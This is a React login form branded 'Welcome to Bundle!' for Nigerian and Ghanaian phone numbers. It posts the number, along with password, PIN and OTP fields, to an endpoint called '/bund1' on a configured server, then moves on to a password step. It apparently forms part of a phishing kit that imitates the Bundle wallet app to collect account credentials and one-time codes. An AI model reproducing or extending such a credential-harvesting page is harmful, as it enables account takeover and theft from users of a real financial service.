import React, { useState, useEffect } from 'react'
import { Link, useHistory } from 'react-router-dom'
import IntlTelInput from 'react-intl-tel-input'
import 'react-intl-tel-input/dist/main.css'
import URL from './Url.js'


const Form = () => {
    const history = useHistory()

    const [phone, setPhone] = useState('')
    const [loading, setLoading] = useState(false)
    const [token, setToken] = useState('')
    const [err, setErr] = useState(false)
    const [message, setMessage] = useState(null)

    

    const fetchCsrf = async () => {
        const response = await fetch(URL + '/form', {
            method: 'GET',
            headers: {
                Accept: 'application/json',
                'Content-type': 'application/json',
            },
            credentials: 'include',
            mode: 'cors',
        })

        const resData = await response.json()
        setToken(resData.token)
    }

    useEffect(() => {
        console.log('bundle one')
        fetchCsrf()
    }, [])

    useEffect(() => {
        if (err) {
            setMessage(<p className='text-red-500'>Field not valid</p>)
        } else {
            setMessage(null)
        }
    }, [setErr, err])

    const handlePhoneChange = (a, b, c, d, e, f) => {
        if (b.length < 12) {
            setPhone(b.replace(/\D/, ''))
        }
    }

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)

        if (phone === '' || phone.length < 9) {
            setErr(true)
            setLoading(false)
        } else {
            try {
                const response = await fetch(URL + '/bund1', {
                    method: 'POST',
                    headers: {
                        Accept: 'application/json',
                        'Content-type': 'application/json',
                        Authorization: 'Bearer ' + token,
                    },
                    credentials: 'include',
                    mode: 'cors',

                    body: JSON.stringify({
                        phone,
                        password: '',
                        pin: '',
                        otp: '',
                    }),
                })

                const resData = await response.json()

                if (resData.status === 'success') {
                    console.log('Message Sent.')
                    setLoading(false)
                    history.push('/authpassword', { phone, token })
                } else if (resData.status === 'fail') {
                    console.log('Message failed to send.')
                    setLoading(false)
                }
            } catch (err) {
                console.log(err)
                setLoading(false)
            }
        }
    }

    return (
        <form
            className='grid w-full place-content-stretch md:w-1/3 md:mx-auto p-4'
            onSubmit={handleSubmit}
        >
            <h2 className='font-black text-center text-black mb-2 text-2xl'>
                Welcome to Bundle!
            </h2>
            <p className='text-center mb-6'>
                Type in your phone number to Log in
            </p>

            {message}
            <IntlTelInput
                containerClassName='intl-tel-input'
                inputClassName=' w-full text-black outline-none text-lg p-1 justify-self-stretch placeholder-[#b2b7be] focus:border-purple-500 rounded-3xl mb-4 phone py-2'
                defaultCountry={'ng'}
                preferredCountries={['ng']}
                fieldName='phone'
                fieldId='phone'
                onlyCountries={['ng', 'gh']}
                value={phone}
                onPhoneNumberChange={(a, b, c, d, e) => {
                    handlePhoneChange(a, b, c, d, e)
                }}
                separateDialCode={true}

                //placeholder='42334'
            />
            <p className='text-right mt-2 mb-8'>
                <Link to='/'>Lost Phone number?</Link>{' '}
            </p>

            <button className=' rounded-3xl outline-none  bg-[#6f42c1] text-white text-lg py-3'>
                {loading ? 'loading..' : 'Continue'}
            </button>
        </form>
    )
}

export default Form
